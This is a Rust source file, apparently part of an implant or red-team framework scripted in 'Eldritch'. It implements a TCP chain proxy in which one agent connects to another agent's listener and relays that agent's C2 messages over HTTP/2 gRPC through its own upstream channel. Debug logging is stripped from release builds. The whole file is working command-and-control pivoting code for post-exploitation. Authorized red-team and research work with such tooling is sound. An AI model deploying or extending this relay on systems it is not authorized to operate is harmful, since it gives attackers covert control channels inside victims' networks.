use anyhow::{anyhow, Result};
use bytes::Bytes;
use eldritch_agent::Agent;
use http_body_util::{BodyExt, Full};
use hyper::body::Incoming;
use hyper::service::service_fn;
use hyper::{Request as HyperRequest, Response as HyperResponse};
use hyper_util::rt::{TokioExecutor, TokioIo};

use std::convert::Infallible;
use std::sync::Arc;

async fn handle_request(
    agent: Arc<dyn Agent>,
    mut req: HyperRequest<Incoming>,
) -> Result<HyperResponse<Full<Bytes>>, Infallible> {
    let path = req.uri().path().to_string();
    #[cfg(debug_assertions)]
    log::debug!("[tcp-chain-server] incoming forward request: {}", path);

    let grpc_response = |body: Vec<u8>| {
        HyperResponse::builder()
            .status(200)
            .header("content-type", "application/grpc+proto")
            .header("grpc-status", "0")
            .body(Full::new(Bytes::from(body)))
            .unwrap()
    };

    let _grpc_error = |code: u32, msg: String| {
        #[cfg(debug_assertions)]
        log::error!("tcp chain proxy: {} — {}", path, msg);
        HyperResponse::builder()
            .status(200)
            .header("content-type", "application/grpc+proto")
            .header("grpc-status", code.to_string())
            .header("grpc-message", msg)
            .body(Full::new(Bytes::new()))
            .unwrap()
    };

    let (tx_in, rx_in) = tokio::sync::mpsc::channel(100);
    let (tx_out, mut rx_out) = tokio::sync::mpsc::channel(100);

    let path_clone = path.clone();
    let agent_clone = agent.clone();

    tokio::task::spawn_blocking(move || {
        if let Err(e) = agent_clone.forward_raw(path_clone, rx_in, tx_out) {
            #[cfg(debug_assertions)]
            log::error!("tcp forward_raw error: {}", e);
            #[cfg(not(debug_assertions))]
            let _ = e;
        }
    });

    tokio::spawn(async move {
        let mut buffer = bytes::BytesMut::new();
        while let Some(Ok(frame)) = req.body_mut().frame().await {
            if let Some(data) = frame.data_ref() {
                buffer.extend_from_slice(data);
                while buffer.len() >= 5 {
                    let len =
                        u32::from_be_bytes([buffer[1], buffer[2], buffer[3], buffer[4]]) as usize;
                    if buffer.len() >= 5 + len {
                        let _header = buffer.split_to(5);
                        let payload = buffer.split_to(len);
                        if tx_in.send(payload.to_vec()).await.is_err() {
                            break;
                        }
                    } else {
                        break;
                    }
                }
            }
        }
    });

    let mut out_bytes = Vec::new();
    while let Some(payload) = rx_out.recv().await {
        let len = payload.len() as u32;
        out_bytes.push(0);
        out_bytes.extend_from_slice(&len.to_be_bytes());
        out_bytes.extend_from_slice(&payload);
    }

    Ok(grpc_response(out_bytes))
}

/// Start a chain proxy server by connecting to Agent B's TCP listener at `addr`.
///
/// Agent A calls `chain.tcp("0.0.0.0:8443")` in an Eldritch script.
/// That spawns this function as an async task.
/// Agent A connects outward to Agent B's bound TCP port.
/// Agent A then serves HTTP/2 on that connection.
/// Agent B's C2 messages enter through the TCP socket and exit through
/// Agent A's normal upstream channel.
pub async fn start_tcp_chain_server(addr: &str, agent: Arc<dyn Agent>) -> Result<()> {
    #[cfg(debug_assertions)]
    log::info!(
        "[tcp-chain-server] connecting to Agent B's TCP listener at {}",
        addr
    );

    let stream = match tokio::net::TcpStream::connect(addr).await {
        Ok(s) => {
            #[cfg(debug_assertions)]
            log::info!("[tcp-chain-server] connected to Agent B at {}", addr);
            s
        }
        Err(e) => {
            #[cfg(debug_assertions)]
            log::error!("[tcp-chain-server] connect error: {}", e);
            return Err(anyhow!(
                "Failed to connect to Agent B TCP listener at {}: {}",
                addr,
                e
            ));
        }
    };

    let agent_clone = agent.clone();
    let io = TokioIo::new(stream);

    #[cfg(debug_assertions)]
    log::debug!("[tcp-chain-server] starting HTTP/2 on connection to Agent B");
    let service = service_fn(move |req| {
        let a = agent_clone.clone();
        async move { handle_request(a, req).await }
    });

    if let Err(err) = hyper::server::conn::http2::Builder::new(TokioExecutor::new())
        .serve_connection(io, service)
        .await
    {
        #[cfg(debug_assertions)]
        log::error!("[tcp-chain-server] HTTP/2 connection error: {:?}", err);
        return Err(anyhow!("HTTP/2 connection to Agent B failed: {:?}", err));
    }

    #[cfg(debug_assertions)]
    log::info!("[tcp-chain-server] connection closed cleanly");
    Ok(())
}
